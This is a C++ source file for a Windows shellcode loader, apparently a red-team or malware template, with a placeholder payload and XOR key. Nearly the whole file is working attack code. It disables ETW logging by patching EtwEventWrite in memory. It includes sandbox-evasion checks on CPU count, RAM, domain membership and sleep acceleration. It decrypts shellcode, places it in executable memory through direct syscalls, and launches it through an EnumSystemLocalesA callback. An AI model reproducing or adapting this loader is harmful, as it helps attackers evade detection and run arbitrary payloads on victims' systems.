#include <windows.h>
#include <iostream>
#include "syscalls.h"
#include "lm.h"
#pragma comment(lib, "netapi32.lib")

// --- Set Payload ---
unsigned char shellcode[] = "SHELLCODE_HERE";

size_t shellcode_len = sizeof(shellcode);
char key[] = "KEY"; // Input 2 (XOR Key)

// --- XOR Decryption Routine ---
void XOR(char* data, size_t data_len, char* key, size_t key_len) {

        int j;
        j = 0;
        for (int i = 0; i < data_len; i++) {
                if (j == key_len - 1) j = 0;
                data[i] = data[i] ^ key[j];
                j++;
        }
}

void processors() {

        // Check if <X processors
        int minprocs = 2;
        SYSTEM_INFO sysinfo;
        GetSystemInfo(&sysinfo);
        int numprocs = sysinfo.dwNumberOfProcessors;
        if (numprocs < minprocs) {
                exit(0);
        }
}

void domainJoined() {

        // Check if domain joined
        PWSTR domainName;
        NETSETUP_JOIN_STATUS status;
        NetGetJoinInformation(NULL, &domainName, &status);
        if (status != NetSetupDomainName) {
                exit(0);
        }
}

void ram() {

        // Check if <X RAM
        MEMORYSTATUSEX totram;
        totram.dwLength = sizeof(totram);
        GlobalMemoryStatusEx(&totram);
        if ((float)totram.ullTotalPhys / 1073741824 < 4) {
                exit(0);
        }
}

void skipSleep() {

        // Check if long sleeps fast forwarded
        DWORD uptimebeforesleep = GetTickCount();
        LARGE_INTEGER Interval;
        Interval.QuadPart = -900000000;
        NtDelayExecution(FALSE, &Interval);
        DWORD uptimeaftersleep = GetTickCount();

        // If sleep accelerated exit (sleep for 90s, if time passed <75s exit)
        if (uptimeaftersleep - uptimebeforesleep < 75000) {
                exit(0);
        };
}

int patchETW(void) {

        HANDLE curproc = GetCurrentProcess();
        UCHAR patch[] = { 0x48, 0x33, 0xc0, 0xc3 }; // x64 Patch [XOR RAX,RAX][RET], for x32 use { 0x33, 0xc0, 0xc2, 0x14, 0x00 } [XOR EAX,EAX][RET]
        size_t size = sizeof(patch);

        unsigned char EEW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
        LPVOID EEWAddress = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)EEW);

        // Alternative Method : LPVOID EEWAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "EtwEventWrite");

        DWORD oldprotect;
        LPVOID lpBaseAddress = EEWAddress;
        ULONG NewProtection;

        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, PAGE_READWRITE, &oldprotect);
        NtWriteVirtualMemory(curproc, EEWAddress, (PVOID)patch, sizeof(patch), NULL);
        NtProtectVirtualMemory(curproc, &lpBaseAddress, &size, oldprotect, &NewProtection);

        return 0;
}


void run() {

        PVOID lbuffer = nullptr;
        HANDLE curproc = GetCurrentProcess();

        XOR((char*)shellcode, shellcode_len, key, sizeof(key));

        // Allocate memory with permissions RW
        NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

        // Write code into memory
        NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);

        // Change permissions to RX
        ULONG old_protect;
        NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READWRITE, &old_protect);

        // Execute
        EnumSystemLocalesA((LOCALE_ENUMPROCA)lbuffer, 0);
}

// --- MAIN ---
int main(int argc, char** argv) {

        patchETW();
        //processors();
        //domainJoined();
        //ram();
        //skipSleep();
        run();

}
